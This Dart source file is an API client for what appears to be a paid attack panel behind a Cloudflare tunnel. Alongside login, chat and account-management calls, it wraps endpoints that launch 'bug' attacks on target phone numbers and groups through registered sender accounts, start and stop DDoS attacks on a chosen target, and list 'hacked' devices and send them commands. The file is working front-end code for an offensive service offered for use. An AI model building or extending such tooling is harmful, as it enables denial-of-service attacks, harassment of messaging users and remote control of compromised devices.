import 'dart:convert';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';

class ApiService {
  static const String _baseUrl = 'https://historical-air-difficulty-genres.trycloudflare.com';

  static String get baseUrl => _baseUrl;

  static Future<String?> _getToken() async {    final prefs = await SharedPreferences.getInstance();
    return prefs.getString('auth_token');
  }

  static Map<String, String> _headers({String? token}) {
    final headers = <String, String>{'Content-Type': 'application/json'};
    if (token != null) headers['Authorization'] = 'Bearer $token';
    return headers;
  }

  static Future<Map<String, dynamic>> login(String username, String password) async {
    final res = await http.post(
      Uri.parse('$_baseUrl/api/auth/login'),
      headers: _headers(),
      body: jsonEncode({'username': username, 'password': password}),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> register(String username, String password) async {
    final res = await http.post(
      Uri.parse('$_baseUrl/api/auth/register'),
      headers: _headers(),
      body: jsonEncode({'username': username, 'password': password}),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> getProfile() async {
    final token = await _getToken();
    final res = await http.get(
      Uri.parse('$_baseUrl/api/auth/profile'),
      headers: _headers(token: token),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> changePassword(String oldPass, String newPass) async {
    final token = await _getToken();
    final res = await http.put(
      Uri.parse('$_baseUrl/api/auth/change-password'),
      headers: _headers(token: token),
      body: jsonEncode({'oldPassword': oldPass, 'newPassword': newPass}),
    );
    return jsonDecode(res.body);
  }

  static Future<void> sendHeartbeat() async {
    try {
      final token = await _getToken();
      await http.post(
        Uri.parse('$_baseUrl/api/auth/heartbeat'),
        headers: _headers(token: token),
      );
    } catch (_) {}
  }

  static Future<void> sendLogoutStatus() async {
    try {
      final token = await _getToken();
      await http.post(
        Uri.parse('$_baseUrl/api/auth/logout-status'),
        headers: _headers(token: token),
      );
    } catch (_) {}
  }

  static Future<Map<String, dynamic>> getStats() async {
    final token = await _getToken();
    final res = await http.get(
      Uri.parse('$_baseUrl/api/stats'),
      headers: _headers(token: token),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> post(String path, Map<String, dynamic> body) async {
    final token = await _getToken();
    final res = await http.post(
      Uri.parse('$_baseUrl$path'),
      headers: _headers(token: token),
      body: jsonEncode(body),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> get(String path) async {
    final token = await _getToken();
    final res = await http.get(
      Uri.parse('$_baseUrl$path'),
      headers: _headers(token: token),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> getSenders() async {
    final token = await _getToken();
    final res = await http.get(
      Uri.parse('$_baseUrl/api/senders'),
      headers: _headers(token: token),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> addSenderWithPhone(String phone) async {
    final token = await _getToken();
    final res = await http.post(
      Uri.parse('$_baseUrl/api/senders/add'),
      headers: _headers(token: token),
      body: jsonEncode({'phone': phone}),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> getSenderStatus(String senderId) async {
    final token = await _getToken();
    final res = await http.get(
      Uri.parse('$_baseUrl/api/senders/$senderId/status'),
      headers: _headers(token: token),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> deleteSender(String senderId) async {
    final token = await _getToken();
    final res = await http.delete(
      Uri.parse('$_baseUrl/api/senders/$senderId'),
      headers: _headers(token: token),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> executeBug({
    required String senderId,
    required String target,
    required String method,
    double delay = 1.0,
    int count = 1,
  }) async {
    final token = await _getToken();
    final res = await http.post(
      Uri.parse('$_baseUrl/api/bug/execute'),
      headers: _headers(token: token),
      body: jsonEncode({
        'senderId': senderId,
        'target': target,
        'method': method,
        'delay': delay,
        'count': count,
      }),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> ownerGetAllSenders() async {
    final token = await _getToken();
    final res = await http.get(
      Uri.parse('$_baseUrl/api/owner/senders'),
      headers: _headers(token: token),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> ownerGetAllUsers() async {
    final token = await _getToken();
    final res = await http.get(
      Uri.parse('$_baseUrl/api/owner/users'),
      headers: _headers(token: token),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> ownerTransferSender(String senderId, String targetUserId) async {
    final token = await _getToken();
    final res = await http.post(
      Uri.parse('$_baseUrl/api/owner/senders/transfer'),
      headers: _headers(token: token),
      body: jsonEncode({'senderId': senderId, 'targetUserId': targetUserId}),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> ownerCreateOwner(String username, String password) async {
    final token = await _getToken();
    final res = await http.post(
      Uri.parse('$_baseUrl/api/owner/create-owner'),
      headers: _headers(token: token),
      body: jsonEncode({'username': username, 'password': password}),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> ownerCreatePremium(String username, String password) async {
    final token = await _getToken();
    final res = await http.post(
      Uri.parse('$_baseUrl/api/owner/create-premium'),
      headers: _headers(token: token),
      body: jsonEncode({'username': username, 'password': password}),
    );
    return jsonDecode(res.body);
  }
  static Future<Map<String, dynamic>> executeBugGroup({
    required String senderId,
    required String target,
    required String method,
    double delay = 1.0,
    int count = 1,
  }) async {
    final token = await _getToken();
    final res = await http.post(
      Uri.parse('$_baseUrl/api/bug/execute-group'),
      headers: _headers(token: token),
      body: jsonEncode({
        'senderId': senderId,
        'target': target,
        'method': method,
        'delay': delay,
        'count': count,
      }),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> ddosStart({
    required String target,
    required int time,
  }) async {
    final token = await _getToken();
    final res = await http.post(
      Uri.parse('$_baseUrl/api/ddos/start'),
      headers: _headers(token: token),
      body: jsonEncode({'target': target, 'time': time}),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> ddosStop({String? attackId}) async {
    final token = await _getToken();
    final res = await http.post(
      Uri.parse('$_baseUrl/api/ddos/stop'),
      headers: _headers(token: token),
      body: jsonEncode({'attackId': attackId}),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> ddosMultiStart({
    required String target,
    required int time,
    required String method,
    int cooldownMinutes = 20,
  }) async {
    final token = await _getToken();
    final res = await http.post(
      Uri.parse('$_baseUrl/api/ddos/multi/start'),
      headers: _headers(token: token),
      body: jsonEncode({'target': target, 'time': time, 'method': method, 'cooldownMinutes': cooldownMinutes}),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> ddosMultiStop({required String attackId}) async {
    final token = await _getToken();
    final res = await http.post(
      Uri.parse('$_baseUrl/api/ddos/multi/stop'),
      headers: _headers(token: token),
      body: jsonEncode({'attackId': attackId}),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> ddosMultiStatus() async {
    final token = await _getToken();
    final res = await http.get(
      Uri.parse('$_baseUrl/api/ddos/multi/status'),
      headers: _headers(token: token),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> ddosMultiCooldown() async {
    final token = await _getToken();
    final res = await http.get(
      Uri.parse('$_baseUrl/api/ddos/multi/cooldown'),
      headers: _headers(token: token),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> updateAvatar(String base64Avatar) async {
    final token = await _getToken();
    final res = await http.put(
      Uri.parse('$_baseUrl/api/auth/avatar'),
      headers: _headers(token: token),
      body: jsonEncode({'avatar': base64Avatar}),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> getChatMessages({String room = 'global', int limit = 80}) async {
    final token = await _getToken();
    final res = await http.get(
      Uri.parse('$_baseUrl/api/chat/messages?room=$room&limit=$limit'),
      headers: _headers(token: token),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> sendChatMessage({
    required String text,
    String room = 'global',
    String? replyTo,
    String? mediaBase64,
    String? mediaType,
  }) async {
    final token = await _getToken();
    final body = <String, dynamic>{
      'text': text,
      'room': room,
      if (replyTo != null) 'replyTo': replyTo,
      if (mediaBase64 != null) 'mediaBase64': mediaBase64,
      if (mediaType != null) 'mediaType': mediaType,
    };
    final res = await http.post(
      Uri.parse('$_baseUrl/api/chat/send'),
      headers: _headers(token: token),
      body: jsonEncode(body),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> getChatUsers() async {
    final token = await _getToken();
    final res = await http.get(
      Uri.parse('$_baseUrl/api/chat/users'),
      headers: _headers(token: token),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> deleteChatMessage(String id) async {
    final token = await _getToken();
    final res = await http.delete(
      Uri.parse('$_baseUrl/api/chat/messages/$id'),
      headers: _headers(token: token),
    );
    return jsonDecode(res.body);
  }

  static Future<Map<String, dynamic>> hackedGetDevices() async {
    return await get('/api/hacked/devices');
  }

  static Future<Map<String, dynamic>> hackedSendCommand({
    required String deviceId,
    required String type,
    Map<String, dynamic> payload = const {},
  }) async {
    return await post('/api/hacked/command', {
      'deviceId': deviceId,
      'type': type,
      'payload': payload,
    });
  }

  static Future<Map<String, dynamic>> ownerBanUser(String userId) async {
    return await post('/api/owner/ban-user', {'userId': userId});
  }

  static Future<Map<String, dynamic>> ownerUnban({String? username, String? telegramId}) async {
    final body = <String, dynamic>{};
    if (username != null) body['username'] = username;
    if (telegramId != null) body['telegramId'] = telegramId;
    return await post('/api/owner/unban', body);
  }

  static Future<Map<String, dynamic>> ownerGetBanned() async {
    return await get('/api/owner/banned');
  }

  static Future<Map<String, dynamic>> ownerDeleteSession(String senderId) async {
    final token = await _getToken();
    final res = await http.delete(
      Uri.parse('\$_baseUrl/api/owner/senders/\$senderId'),
      headers: _headers(token: token),
    );
    return jsonDecode(res.body);
  }


}
